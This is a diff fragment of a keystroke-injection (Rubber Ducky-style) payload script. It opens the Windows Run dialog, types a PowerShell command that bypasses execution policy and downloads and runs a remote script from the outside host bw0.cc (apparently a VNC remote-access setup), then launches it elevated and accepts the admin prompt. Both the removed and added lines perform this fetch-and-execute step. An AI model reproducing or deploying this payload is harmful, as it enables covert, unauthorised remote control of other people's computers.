@@ -12,7 +12,7 @@ DEFAULT_DELAY 100
 REM open powershell (remove -W Hidden to show the window).
 GUI r
 DELAY 750
-STRING powershell -Exec Bypass -C $ip = ''; irm https://bw0.cc/uvnc | iex
+STRING powershell -Exec Bypass -C $ip = ''; iex (irm bw0.cc/uvnc)
 CTRL-SHIFT ENTER
 DELAY 2500
 ALT y
